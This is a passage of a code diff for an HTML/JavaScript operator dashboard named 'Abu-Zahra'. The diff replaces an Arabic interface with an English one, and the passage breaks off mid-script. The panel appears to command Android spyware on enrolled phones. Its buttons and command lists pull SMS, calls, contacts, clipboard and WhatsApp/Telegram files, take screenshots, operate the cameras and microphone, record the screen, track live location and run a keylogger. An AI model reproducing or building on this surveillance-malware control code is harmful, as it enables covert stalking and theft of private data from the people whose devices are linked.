 .stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:16px;margin-bottom:24px}
-.stat-card{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:20px;position:relative;overflow:hidden}
-.stat-card::after{content:'';position:absolute;top:0;right:0;width:4px;height:100%;background:var(--accent)}
-.stat-card .label{font-size:.8rem;color:var(--text2);margin-bottom:8px}
-.stat-card .value{font-size:1.8rem;font-weight:700;color:#fff}
-.stat-card .sub{font-size:.75rem;color:var(--text2);margin-top:4px}
-
-/* Tables */
-.data-table{width:100%;border-collapse:collapse;background:var(--surface);border-radius:12px;overflow:hidden;border:1px solid var(--border)}
-.data-table th,.data-table td{text-align:right;padding:12px 16px;border-bottom:1px solid var(--border)}
-.data-table th{background:var(--surface2);color:var(--accent);font-size:.85rem;font-weight:600}
-.data-table tr:hover{background:var(--surface2)}
-
-/* Buttons */
-.btn{padding:8px 16px;border:none;border-radius:8px;cursor:pointer;font-size:.85rem;font-family:inherit;transition:all .2s;display:inline-flex;align-items:center;gap:6px}
-.btn-primary{background:var(--accent);color:#fff}.btn-primary:hover{background:var(--accent2)}
-.btn-danger{background:var(--danger);color:#fff}.btn-danger:hover{background:#c62828}
-.btn-success{background:var(--success);color:#fff}.btn-success:hover{background:#00a844}
-.btn-outline{background:transparent;color:var(--accent);border:1px solid var(--accent)}.btn-outline:hover{background:var(--accent);color:#fff}
-.btn-sm{padding:4px 10px;font-size:.78rem}
-
-/* Badges */
-.badge{display:inline-block;padding:3px 10px;border-radius:20px;font-size:.75rem;font-weight:600}
-.badge-success{background:rgba(0,200,83,.15);color:var(--success)}
-.badge-danger{background:rgba(255,23,68,.15);color:var(--danger)}
-.badge-warning{background:rgba(255,193,7,.15);color:var(--warning)}
-.badge-info{background:rgba(100,181,246,.15);color:var(--info)}
-
-/* Tabs */
-.tabs{display:flex;gap:4px;margin-bottom:20px;border-bottom:1px solid var(--border);padding-bottom:8px;overflow-x:auto}
-.tab{padding:8px 16px;cursor:pointer;font-size:.85rem;color:var(--text2);border-radius:8px 8px 0 0;transition:all .2s;white-space:nowrap}
-.tab:hover,.tab.active{color:var(--accent);background:var(--surface2)}
-
-/* Log box */
-.log-container{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:16px;max-height:400px;overflow-y:auto;font-family:'Courier New',monospace;font-size:.8rem;line-height:1.8}
-.log-entry{padding:2px 0}
-.log-ok{color:var(--success)}.log-warn{color:var(--warning)}.log-err{color:var(--danger)}.log-info{color:var(--info)}
-
-/* Command center */
-.cmd-form{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:20px;margin-bottom:20px}
-.cmd-form h3{color:var(--accent);margin-bottom:16px;font-size:1rem}
-.form-row{display:flex;gap:12px;margin-bottom:12px;flex-wrap:wrap}
-.form-row label{font-size:.85rem;color:var(--text2);min-width:80px;display:flex;align-items:center}
-.form-row select,.form-row input{flex:1;padding:8px 12px;background:var(--surface2);border:1px solid var(--border);border-radius:8px;color:var(--text);font-family:inherit;font-size:.85rem;outline:none}
-.form-row select:focus,.form-row input:focus{border-color:var(--accent)}
-.cmd-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(120px,1fr));gap:8px;margin-top:12px}
-.cmd-btn{padding:8px;background:var(--surface2);border:1px solid var(--border);border-radius:8px;color:var(--text);cursor:pointer;font-size:.78rem;text-align:center;transition:all .2s}
-.cmd-btn:hover{border-color:var(--accent);color:var(--accent);background:rgba(233,69,96,.1)}
-
-/* Sections */
-.section-title{font-size:1rem;color:var(--accent);margin:20px 0 12px;border-right:3px solid var(--accent);padding-right:12px}
-.empty-state{text-align:center;color:var(--text2);padding:40px;font-size:.9rem}
-
-/* Map placeholder */
-.map-container{background:var(--surface);border:1px solid var(--border);border-radius:12px;height:300px;display:flex;align-items:center;justify-content:center;color:var(--text2);font-size:.9rem;position:relative;overflow:hidden}
-.map-container iframe{width:100%;height:100%;border:none}
-
-/* Export buttons */
-.export-row{display:flex;gap:8px;margin:12px 0}
-
-/* Modal */
-.modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:200;justify-content:center;align-items:center}
+.stat-card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:20px}
+.stat-card .label{color:var(--text2);font-size:13px;margin-bottom:8px}
+.stat-card .value{font-size:28px;font-weight:700}
+.stat-card .sub{color:var(--text2);font-size:12px;margin-top:4px}
+.card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:20px;margin-bottom:16px}
+.card h3{margin-bottom:16px;font-size:16px;display:flex;align-items:center;gap:8px}
+table{width:100%;border-collapse:collapse}
+th,td{padding:10px 12px;text-align:right;border-bottom:1px solid var(--border);font-size:13px}
+th{color:var(--text2);font-weight:500}
+.badge{display:inline-block;padding:2px 8px;border-radius:12px;font-size:11px;font-weight:600}
+.badge-green{background:#166534;color:var(--green)}
+.badge-red{background:#7f1d1d;color:#fca5a5}
+.badge-yellow{background:#713f12;color:var(--yellow)}
+.badge-blue{background:#1e3a5f;color:var(--blue)}
+.btn{padding:8px 16px;border:none;border-radius:8px;cursor:pointer;font-size:13px;transition:all .2s;display:inline-flex;align-items:center;gap:6px}
+.btn-primary{background:var(--accent);color:#fff}
+.btn-primary:hover{background:var(--accent2)}
+.btn-secondary{background:var(--surface2);color:var(--text);border:1px solid var(--border)}
+.btn-sm{padding:6px 12px;font-size:12px}
+.btn-danger{background:#7f1d1d;color:#fca5a5}
+.cmd-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:8px}
+.cmd-btn{padding:10px 14px;border-radius:8px;border:1px solid var(--border);background:var(--surface2);color:var(--text);cursor:pointer;font-size:13px;transition:all .2s;text-align:right}
+.cmd-btn:hover{border-color:var(--accent);background:rgba(230,57,70,.1)}
+.device-card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:20px;cursor:pointer;transition:all .2s}
+.device-card:hover{border-color:var(--accent);transform:translateY(-2px)}
+.device-card .name{font-size:16px;font-weight:600;margin-bottom:4px}
+.device-card .meta{color:var(--text2);font-size:12px}
+.device-cards{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:16px}
+.log-item{padding:8px 0;border-bottom:1px solid var(--border);font-size:12px;display:flex;gap:12px}
+.log-item .time{color:var(--text2);white-space:nowrap;font-family:monospace}
+.log-item .event{flex:1}
+.modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:200;align-items:center;justify-content:center}
 .modal-overlay.show{display:flex}
-.modal{background:var(--surface);border:1px solid var(--border);border-radius:16px;padding:24px;width:90%;max-width:600px;max-height:80vh;overflow-y:auto}
-.modal h3{color:var(--accent);margin-bottom:16px}
-.modal-close{float:left;background:none;border:none;color:var(--text2);font-size:1.5rem;cursor:pointer}
-
-/* Settings page */
-.setting-group{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:20px;margin-bottom:16px}
-.setting-group h3{color:var(--accent);margin-bottom:12px;font-size:.95rem}
-.setting-row{display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid var(--border)}
-.setting-row:last-child{border-bottom:none}
-.toggle{width:44px;height:24px;background:var(--border);border-radius:12px;cursor:pointer;position:relative;transition:background .2s}
-.toggle.on{background:var(--accent)}
-.toggle::after{content:'';position:absolute;width:20px;height:20px;background:#fff;border-radius:50%;top:2px;right:2px;transition:transform .2s}
-.toggle.on::after{transform:translateX(-20px)}
-
-/* Responsive */
+.modal{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:24px;width:500px;max-width:90vw;max-height:80vh;overflow-y:auto}
+.modal h2{margin-bottom:16px;font-size:18px}
+.search-box{display:flex;gap:8px;margin-bottom:16px}
+.search-box input{flex:1;padding:10px 14px;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text);font-size:14px;outline:none}
+.hamburger{display:none;position:fixed;top:16px;right:16px;z-index:150;background:var(--accent);color:#fff;border:none;width:40px;height:40px;border-radius:8px;font-size:20px;cursor:pointer}
 @media(max-width:768px){
 .sidebar{transform:translateX(100%)}
 .sidebar.open{transform:translateX(0)}
-.main{margin-right:0!important}
+.main{margin-right:0;padding:16px;padding-top:60px}
 .hamburger{display:block}
-.stats-grid{grid-template-columns:repeat(auto-fit,minmax(150px,1fr))}
-.form-row{flex-direction:column}
-.form-row label{min-width:auto}
+.stats-grid{grid-template-columns:repeat(2,1fr)}
+.device-cards{grid-template-columns:1fr}
+.cmd-grid{grid-template-columns:repeat(auto-fill,minmax(160px,1fr))}
 }
-
-/* Scrollbar */
-::-webkit-scrollbar{width:6px}
-::-webkit-scrollbar-track{background:var(--bg)}
-::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}
-::-webkit-scrollbar-thumb:hover{background:var(--accent)}
-
-/* Animations */
-@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
 .pulse{animation:pulse 2s infinite}
-@keyframes slideIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
-.slide-in{animation:slideIn .3s ease}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
+.empty{text-align:center;color:var(--text2);padding:40px;font-size:14px}
+.tabs{display:flex;gap:4px;margin-bottom:16px;flex-wrap:wrap}
+.tab{padding:8px 16px;border-radius:8px;border:1px solid var(--border);background:transparent;color:var(--text2);cursor:pointer;font-size:13px;transition:all .2s}
+.tab.active{background:var(--accent);color:#fff;border-color:var(--accent)}
+.notification{position:fixed;top:20px;left:20px;background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:12px 20px;z-index:300;transform:translateX(-400px);transition:transform .3s;font-size:14px}
+.notification.show{transform:translateX(0)}
+.command-log .cmd-item{padding:10px;border:1px solid var(--border);border-radius:8px;margin-bottom:8px;background:var(--surface2)}
+.command-log .cmd-item .cmd-header{display:flex;justify-content:space-between;margin-bottom:6px}
 </style>
 </head>
 <body>
-
-<!-- Login Page -->
-<div class="login-wrap" id="loginPage">
+<div class="login-page" id="loginPage">
 <div class="login-box">
-<h1>&#x1F9D1;&#x200D;&#x1F9B0;</h1>
-<h2>أبو زهرة</h2>
-<p>لوحة التحكم الشاملة</p>
-<input type="text" id="loginUser" placeholder="اسم المستخدم" value="admin" autocomplete="off">
-<input type="password" id="loginPass" placeholder="كلمة المرور">
-<button onclick="doLogin()">تسجيل الدخول</button>
-<div class="login-error" id="loginError">اسم المستخدم أو كلمة المرور غير صحيحة</div>
+<h1>🟥 Abu-Zahra</h1>
+<p>Control Dashboard</p>
+<input type="text" id="loginUser" placeholder="Username" value="admin">
+<input type="password" id="loginPass" placeholder="Password">
+<button onclick="doLogin()">Login</button>
+<div class="login-error" id="loginError">Invalid credentials</div>
 </div>
 </div>
 
-<!-- Dashboard -->
-<div id="dashboardPage" style="display:none">
-<!-- Sidebar -->
-<div class="sidebar" id="sidebar">
-<div class="sidebar-header">
-<h2>&#x1F534; أبو زهرة</h2>
-<span class="dot pulse"></span> <span style="font-size:.8rem;color:var(--text2)">متصل</span>
-</div>
-<div class="nav-item active" data-page="home" onclick="showPage('home')"><span class="icon">&#x1F3E0;</span> الرئيسية</div>
-<div class="nav-item" data-page="devices" onclick="showPage('devices')"><span class="icon">&#x1F4F1;</span> الأجهزة</div>
-<div class="nav-item" data-page="map" onclick="showPage('map')"><span class="icon">&#x1F5FA;</span> الخريطة</div>
-<div class="nav-item" data-page="data" onclick="showPage('data')"><span class="icon">&#x1F4CA;</span> البيانات</div>
-<div class="nav-item" data-page="commands" onclick="showPage('commands')"><span class="icon">&#x1F3AE;</span> مركز الأوامر</div>
-<div class="nav-item" data-page="logs" onclick="showPage('logs')"><span class="icon">&#x1F4DD;</span> سجل الأحداث</div>
-<div class="nav-item" data-page="sessions" onclick="showPage('sessions')"><span class="icon">&#x1F511;</span> الجلسات</div>
-<div class="nav-item" data-page="settings" onclick="showPage('settings')"><span class="icon">&#x2699;</span> الإعدادات</div>
-<div style="padding:20px;border-top:1px solid var(--border);margin-top:auto">
-<button class="btn btn-danger" style="width:100%" onclick="doLogout()">&#x1F6AA; تسجيل الخروج</button>
-</div>
+<button class="hamburger" id="hamburger" onclick="toggleSidebar()">☰</button>
+
+<div class="app" id="app">
+<nav class="sidebar" id="sidebar">
+<div class="logo"><h2>🟥 Abu-Zahra</h2><span>Control Panel v3.0</span></div>
+<a class="active" onclick="showPage('dashboard')">📊 Dashboard</a>
+<a onclick="showPage('devices')">📱 Devices</a>
+<a onclick="showPage('commands')">🎮 Commands</a>
+<a onclick="showPage('files')">📂 Files</a>
+<a onclick="showPage('data')">📦 Data</a>
+<a onclick="showPage('monitor')">🔍 Monitor</a>
+<a onclick="showPage('settings')">⚙️ Settings</a>
+<a onclick="showPage('logs')">📝 Logs</a>
+<a onclick="doLogout()">🚪 Logout</a>
+</nav>
+<div class="main">
+
+<div class="page active" id="page-dashboard">
+<div class="topbar"><h1>📊 Dashboard</h1><span class="time" id="clock"></span></div>
+<div class="stats-grid" id="statsGrid"></div>
+<div class="card"><h3>📱 Active Devices</h3><div id="dashDevices" class="device-cards"></div></div>
+<div class="card"><h3>📋 Recent Commands</h3><div id="dashCommands"></div></div>
 </div>
 
-<!-- Main Content -->
-<div class="main" id="mainContent">
-<div class="topbar">
-<button class="hamburger" onclick="toggleSidebar()">&#x2630;</button>
-<h1 id="pageTitle">الرئيسية</h1>
-<div class="topbar-actions">
-<span style="font-size:.8rem;color:var(--text2)" id="clockDisplay"></span>
-</div>
+<div class="page" id="page-devices">
+<div class="topbar"><h1>📱 Devices</h1><button class="btn btn-primary" onclick="generateLink()">🔗 Link Device</button></div>
+<div id="linkCodeBox" style="display:none" class="card"><h3>🔗 Link Code</h3><p id="linkCodeText" style="font-size:24px;font-weight:bold;text-align:center;color:var(--accent)"></p></div>
+<div class="device-cards" id="deviceList"></div>
+<div class="card" id="deviceDetail" style="display:none"></div>
 </div>
 
-<div class="content">
-<!-- Home Page -->
-<div class="page" id="page-home">
-<div class="stats-grid">
-<div class="stat-card"><div class="label">&#x23F1; وقت التشغيل</div><div class="value" id="sUptime">--</div><div class="sub">بالثواني</div></div>
-<div class="stat-card"><div class="label">&#x1F4F1; الأجهزة</div><div class="value" id="sDevices">0</div><div class="sub">مسجل</div></div>
-<div class="stat-card"><div class="label">&#x27;05;&#x200D;&#x274C; متصل</div><div class="value" id="sOnline">0</div><div class="sub">جهاز نشط</div></div>
-<div class="stat-card"><div class="label">&#x1F4AC; الرسائل</div><div class="value" id="sMessages">0</div><div class="sub">مرسلة</div></div>
-<div class="stat-card"><div class="label">&#x1F4CB; الأوامر</div><div class="value" id="sCommands">0</div><div class="sub">معلقة</div></div>
-<div class="stat-card"><div class="label">&#x1F4CA; طلبات API</div><div class="value" id="sApiHits">0</div><div class="sub">طلب</div></div>
+<div class="page" id="page-commands">
+<div class="topbar"><h1>🎮 Command Center</h1></div>
+<div class="card"><h3>Send Command</h3>
+<div class="search-box"><select id="cmdDevice" style="flex:1;padding:10px;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text)"></select></div>
+<div class="tabs" id="cmdTabs"></div>
+<div class="cmd-grid" id="cmdGrid"></div>
 </div>
-<div class="section-title">&#x1F4F1; آخر الأجهزة</div>
-<table class="data-table"><thead><tr><th>الاسم</th><th>المعرف</th><th>الحالة</th><th>آخر نشاط</th></tr></thead><tbody id="homeDevices"></tbody></table>
-<div class="section-title">&#x1F4DD; آخر الأحداث</div>
-<div class="log-container" id="homeLog"></div>
+<div class="card"><h3>Command Log</h3><div id="cmdLog" class="command-log"></div></div>
 </div>
 
-<!-- Devices Page -->
-<div class="page" id="page-devices" style="display:none">
-<div class="export-row">
-<button class="btn btn-outline btn-sm" onclick="exportData('json')">&#x1F4C4; JSON</button>
-<button class="btn btn-outline btn-sm" onclick="exportData('csv')">&#x1F4CA; CSV</button>
-</div>
-<table class="data-table"><thead><tr><th>الاسم</th><th>المعرف</th><th>الموديل</th><th>البطارية</th><th>الحالة</th><th>آخر نشاط</th><th>إجراءات</th></tr></thead><tbody id="devicesTable"></tbody></table>
-<div class="empty-state" id="noDevices" style="display:none">لا توجد أجهزة مسجلة</div>
-</div>
-
-<!-- Map Page -->
-<div class="page" id="page-map" style="display:none">
-<div class="map-container" id="mapContainer">
-<span>&#x1F5FA; جارٍ تحميل الخريطة...</span>
-</div>
-</div>
-
-<!-- Data Page -->
-<div class="page" id="page-data" style="display:none">
-<div class="tabs">
-<div class="tab active" data-tab="sms" onclick="showDataTab('sms')">&#x1F4E8; رسائل SMS</div>
-<div class="tab" data-tab="calls" onclick="showDataTab('calls')">&#x1F4DE; المكالمات</div>
-<div class="tab" data-tab="contacts" onclick="showDataTab('contacts')">&#x1F4C7; جهات الاتصال</div>
-<div class="tab" data-tab="notifications" onclick="showDataTab('notifications')">&#x1F514; الإشعارات</div>
-<div class="tab" data-tab="apps" onclick="showDataTab('apps')">&#x1F4F1; التطبيقات</div>
-</div>
-<div class="cmd-form">
-<div class="form-row"><label>الجهاز:</label><select id="dataDeviceSelect"><option value="">-- اختر جهاز --</option></select></div>
-</div>
-<div id="dataContent" class="log-container" style="min-height:200px"><span class="log-info">اختر جهازاً ونوع البيانات</span></div>
+<div class="page" id="page-files">
+<div class="topbar"><h1>📂 File Browser</h1></div>
+<div class="card"><h3>Select device to browse files</h3>
+<select id="fileDevice" style="width:100%;padding:10px;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text)"></select>
+<div class="cmd-grid" style="margin-top:12px">
+<button class="cmd-btn" onclick="sendCmd('list_downloads')">📥 Downloads</button>
+<button class="cmd-btn" onclick="sendCmd('list_dcim')">📸 DCIM</button>
+<button class="cmd-btn" onclick="sendCmd('list_music')">🎵 Music</button>
+<button class="cmd-btn" onclick="sendCmd('list_videos')">🎬 Videos</button>
+<button class="cmd-btn" onclick="sendCmd('list_documents')">📁 Documents</button>
+<button class="cmd-btn" onclick="sendCmd('list_whatsapp')">💬 WhatsApp</button>
+<button class="cmd-btn" onclick="sendCmd('list_telegram_files')">✈️ Telegram</button>
+<button class="cmd-btn" onclick="sendCmd('recent_files')">🕐 Recent</button>
+</div></div>
 </div>
 
-<!-- Command Center Page -->
-<div class="page" id="page-commands" style="display:none">
-<div class="cmd-form">
-<h3>&#x1F3AE; إرسال أمر للجهاز</h3>
-<div class="form-row"><label>الجهاز:</label><select id="cmdDeviceSelect"><option value="">-- اختر جهاز --</option></select></div>
-<div class="form-row"><label>الأمر:</label><select id="cmdSelect">
-<option value="ping">&#x1F4E1; فحص اتصال</option>
-<option value="get_sms">&#x1F4E8; رسائل SMS</option>
-<option value="get_calls">&#x1F4DE; المكالمات</option>
-<option value="get_contacts">&#x1F4C7; جهات الاتصال</option>
-<option value="get_location">&#x1F4CD; الموقع</option>
-<option value="get_notifications">&#x1F514; الإشعارات</option>
-<option value="get_apps">&#x1F4F1; التطبيقات</option>
-<option value="get_info">&#x2139; معلومات الجهاز</option>
-<option value="get_battery">&#x1F50B; البطارية</option>
-<option value="get_gallery">&#x1F5BC; المعرض</option>
-<option value="get_clipboard">&#x1F4CB; الحافظة</option>
-<option value="get_all">&#x1F4E5; جميع البيانات</option>
-<option value="vibrate">&#x1F4F3; اهتزاز</option>
-<option value="ring">&#x1F514; رنين</option>
-<option value="screenshot">&#x1F4F7; لقطة شاشة</option>
-<option value="front_camera">&#x1F4F7; كاميرا أمامية</option>
-<option value="back_camera">&#x1F4F8; كاميرا خلفية</option>
-<option value="record_audio">&#x1F3A4; تسجيل صوت</option>
-<option value="flash_on">&#x1F526; تشغيل الفلاش</option>
-<option value="flash_off">&#x1F526; إطفاء الفلاش</option>
-<option value="get_whatsapp">&#x1F4AC; واتساب</option>
-<option value="get_telegram">&#x2708; تليجرام</option>
-<option value="get_instagram">&#x1F4F8; انستجرام</option>
-<option value="location_live">&#x1F4CD; تتبع مباشر</option>
-<option value="location_stop">&#x23F9; إيقاف التتبع</option>
-<option value="location_history">&#x1F4DC; سجل المواقع</option>
-<option value="app_usage">&#x1F4CA; استخدام التطبيقات</option>
-<option value="screen_time">&#x23F1; وقت الشاشة</option>
-<option value="keylogger_get">&#x2328; بيانات المفاتيح</option>
-</select></div>
-<button class="btn btn-primary" onclick="sendCommand()">&#x1F680; إرسال الأمر</button>
-</div>
-<div class="section-title">&#x1F4CB; الأوامر السابقة</div>
-<div class="log-container" id="cmdHistory"></div>
+<div class="page" id="page-data">
+<div class="topbar"><h1>📦 Data Viewer</h1></div>
+<div class="card"><h3>Quick Data</h3>
+<select id="dataDevice" style="width:100%;padding:10px;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text);margin-bottom:12px"></select>
+<div class="cmd-grid">
+<button class="cmd-btn" onclick="sendDataCmd('sms')">📲 SMS</button>
+<button class="cmd-btn" onclick="sendDataCmd('calls')">📞 Calls</button>
+<button class="cmd-btn" onclick="sendDataCmd('contacts')">📇 Contacts</button>
+<button class="cmd-btn" onclick="sendDataCmd('location')">📍 Location</button>
+<button class="cmd-btn" onclick="sendDataCmd('notifications')">🔔 Notifications</button>
+<button class="cmd-btn" onclick="sendDataCmd('clipboard')">📋 Clipboard</button>
+<button class="cmd-btn" onclick="sendDataCmd('battery')">🔋 Battery</button>
+<button class="cmd-btn" onclick="sendDataCmd('info')">ℹ️ Device Info</button>
+</div></div>
 </div>
 
-<!-- Logs Page -->
-<div class="page" id="page-logs" style="display:none">
-<div class="export-row">
-<button class="btn btn-outline btn-sm" onclick="clearLogs()">&#x1F5D1; مسح السجل</button>
-</div>
-<div class="log-container" id="logContainer" style="max-height:600px"></div>
-</div>
-
-<!-- Sessions Page -->
-<div class="page" id="page-sessions" style="display:none">
-<table class="data-table"><thead><tr><th>المستخدم</th><th>رمز الجلسة</th><th>تاريخ الإنشاء</th><th>تاريخ الانتهاء</th><th>إجراءات</th></tr></thead><tbody id="sessionsTable"></tbody></table>
-</div>
-
-<!-- Settings Page -->
-<div class="page" id="page-settings" style="display:none">
-<div class="setting-group">
-<h3>&#x2699; الإعدادات العامة</h3>
-<div class="setting-row"><span>فترة المزامنة (ثانية)</span><input type="number" id="setSyncInterval" style="width:80px;text-align:center" onchange="updateSetting('sync_interval',this.value)"></div>
-<div class="setting-row"><span>فترة الموقع (ثانية)</span><input type="number" id="setLocInterval" style="width:80px;text-align:center" onchange="updateSetting('location_interval',this.value)"></div>
-<div class="setting-row"><span>الموقع التلقائي</span><div class="toggle" id="toggleAutoLoc" onclick="toggleSetting('auto_location')"></div></div>
-<div class="setting-row"><span>المزامنة التلقائية</span><div class="toggle" id="toggleAutoSync" onclick="toggleSetting('auto_sync')"></div></div>
-<div class="setting-row"><span>الإشعارات</span><div class="toggle" id="toggleNotify" onclick="toggleSetting('notifications')"></div></div>
-<div class="setting-row"><span>تسجيل المفاتيح</span><div class="toggle" id="toggleKeylog" onclick="toggleSetting('keylogger')"></div></div>
-<div class="setting-row"><span>كشف تغيير الشريحة</span><div class="toggle" id="toggleSim" onclick="toggleSetting('sim_detect')"></div></div>
-<div class="setting-row"><span>مراقبة الواي فاي</span><div class="toggle" id="toggleWifi" onclick="toggleSetting('wifi_monitor')"></div></div>
-</div>
-<div class="setting-group">
-<h3>&#x1F4BE; إدارة البيانات</h3>
-<div class="form-row" style="margin-top:12px">
-<button class="btn btn-primary" onclick="createBackup()">&#x1F4BE; نسخ احتياطي</button>
-<button class="btn btn-outline" onclick="exportData('json')">&#x1F4C4; تصدير JSON</button>
-<button class="btn btn-outline" onclick="exportData('csv')">&#x1F4CA; تصدير CSV</button>
-</div>
-</div>
+<div class="page" id="page-monitor">
+<div class="topbar"><h1>🔍 Monitoring</h1></div>
+<div class="card"><h3>Monitor Controls</h3>
+<select id="monDevice" style="width:100%;padding:10px;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text);margin-bottom:12px"></select>
+<div class="cmd-grid">
+<button class="cmd-btn" onclick="sendMonCmd('keylogger_start')">⌨️ Start Keylogger</button>
+<button class="cmd-btn" onclick="sendMonCmd('keylogger_stop')">⏹ Stop Keylogger</button>
+<button class="cmd-btn" onclick="sendMonCmd('get_keylogger')">📥 Get Keys</button>
+<button class="cmd-btn" onclick="sendMonCmd('screen_record_start')">🔴 Start Screen Record</button>
+<button class="cmd-btn" onclick="sendMonCmd('screen_record_stop')">⏹ Stop Screen Record</button>
+<button class="cmd-btn" onclick="sendMonCmd('location_live')">🗺️ Live Location</button>
+<button class="cmd-btn" onclick="sendMonCmd('location_stop')">⏹ Stop Tracking</button>
+<button class="cmd-btn" onclick="sendMonCmd('location_history')">📜 Location History</button>
+<button class="cmd-btn" onclick="sendMonCmd('sms_monitor')">📲 SMS Monitor</button>
+<button class="cmd-btn" onclick="sendMonCmd('call_monitor')">📞 Call Monitor</button>
+</div></div>
 </div>
 
-</div><!-- content -->
-</div><!-- main -->
-</div><!-- dashboardPage -->
+<div class="page" id="page-settings">
+<div class="topbar"><h1>⚙️ Settings</h1></div>
+<div class="card"><h3>Server Settings</h3>
+<div id="settingsForm"></div>
+<button class="btn btn-primary" onclick="saveSettings()" style="margin-top:12px">💾 Save</button></div>
+</div>
+
+<div class="page" id="page-logs">
+<div class="topbar"><h1>📝 Event Logs</h1><button class="btn btn-secondary btn-sm" onclick="loadEvents()">🔄 Refresh</button></div>
+<div class="card"><div id="eventLog"></div></div>
+</div>
+
+</div></div>
+
+<div class="notification" id="notif"></div>
 
 <script>
-const API=window.location.origin;
-let sessionToken=null;
-let refreshTimer=null;
-let currentPage='home';
-let localApiHits=0;
+let TOKEN=localStorage.getItem('az_token')||'';
+let POLL_INTERVAL=null;
+let DEVICES=[];
 
-// ── Auth ──
-function getCookie(name){const v=document.cookie.match('(^|;) ?'+name+'=([^;]*)(;|$)');return v?v[2]:null}
-function setCookie(name,val,days){const d=new Date;d.setTime(d.getTime()+days*86400000);document.cookie=name+'='+val+';path=/;expires='+d.toUTCString()}
-function delCookie(name){document.cookie=name+'=;path=/;expires=Thu, 01 Jan 1970 00:00:00 UTC'}
+function notify(msg,color='var(--green)'){
+const n=document.getElementById('notif');
+n.textContent=msg;n.style.borderColor=color;n.classList.add('show');
+setTimeout(()=>n.classList.remove('show'),3000);
+}
 
-async function checkSession(){
-  const token=getCookie('az_session');
-  if(!token){showLogin();return false}
-  try{
-    const r=await fetch(API+'/api/sessions?token='+encodeURIComponent(token));
-    if(!r.ok){showLogin();return false}
-    const sessions=await r.json();
-    if(!sessions.find(s=>s.token===token)){showLogin();return false}
-    sessionToken=token;
-    showDashboard();
-    return true;
-  }catch(e){showLogin();return false}
+function api(path,opts={}){
+return fetch('/api/'+path,{
+headers:{'Content-Type':'application/json',...(TOKEN?{'Authorization':'Bearer '+TOKEN}:{})},
+...opts
+}).then(r=>r.json());
 }
 
 async function doLogin(){
-  const user=document.getElementById('loginUser').value;
-  const pass=document.getElementById('loginPass').value;
-  try{
-    const r=await fetch(API+'/api/sessions',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:user,password:pass})});
-    const data=await r.json();
-    if(data.ok&&data.token){
-      sessionToken=data.token;
-      setCookie('az_session',data.token,1);
-      showDashboard();
-    }else{
-      document.getElementById('loginError').style.display='block';
-    }
-  }catch(e){
-    document.getElementById('loginError').style.display='block';
-  }
+const u=document.getElementById('loginUser').value;
+const p=document.getElementById('loginPass').value;
+const r=await api('login',{method:'POST',body:JSON.stringify({username:u,password:p})});
+if(r.ok){TOKEN=r.token;localStorage.setItem('az_token',TOKEN);showApp();}
+else{document.getElementById('loginError').style.display='block';}
 }
 
 function doLogout(){
-  if(sessionToken)fetch(API+'/api/sessions/'+sessionToken,{method:'DELETE'}).catch(()=>{});
-  sessionToken=null;
-  delCookie('az_session');
-  showLogin();
+TOKEN='';localStorage.removeItem('az_token');
+document.getElementById('app').style.display='none';
+document.getElementById('loginPage').style.display='flex';
+if(POLL_INTERVAL)clearInterval(POLL_INTERVAL);
 }
 
-function showLogin(){document.getElementById('loginPage').style.display='flex';document.getElementById('dashboardPage').style.display='none';if(refreshTimer)clearInterval(refreshTimer)}
-function showDashboard(){document.getElementById('loginPage').style.display='none';document.getElementById('dashboardPage').style.display='block';refresh();refreshTimer=setInterval(refresh,5000)}
-
-// ── Navigation ──
-function showPage(page){
-  currentPage=page;
-  document.querySelectorAll('.page').forEach(p=>p.style.display='none');
-  const el=document.getElementById('page-'+page);
-  if(el)el.style.display='block';
-  document.querySelectorAll('.nav-item').forEach(n=>n.classList.toggle('active',n.dataset.page===page));
-  const titles={home:'الرئيسية',devices:'الأجهزة',map:'الخريطة',data:'البيانات',commands:'مركز الأوامر',logs:'سجل الأحداث',sessions:'الجلسات',settings:'الإعدادات'};
-  document.getElementById('pageTitle').textContent=titles[page]||'';
-  if(page==='map')loadMap();
+function showApp(){
+document.getElementById('loginPage').style.display='none';
+document.getElementById('app').style.display='block';
+loadAll();
+POLL_INTERVAL=setInterval(loadAll,5000);
 }
-function toggleSidebar(){document.getElementById('sidebar').classList.toggle('open')}
 
-// ── Clock ──
-function updateClock(){document.getElementById('clockDisplay').textContent=new Date().toLocaleString('ar-SA')}
+function toggleSidebar(){document.getElementById('sidebar').classList.toggle('open');}
+
+function showPage(name){
+document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
+document.getElementById('page-'+name).classList.add('active');
+document.querySelectorAll('.sidebar a').forEach(a=>a.classList.remove('active'));
+event.target.classList.add('active');
+document.getElementById('sidebar').classList.remove('open');
+}
+
+function updateClock(){
+const now=new Date();
+document.getElementById('clock').textContent=now.toLocaleString('en-US');
+}
 setInterval(updateClock,1000);updateClock();
 
-// ── API Calls ──
-async function apiGet(path){
-  localApiHits++;
-  try{
-    const r=await fetch(API+path);
-    if(r.status===401){showLogin();return null}
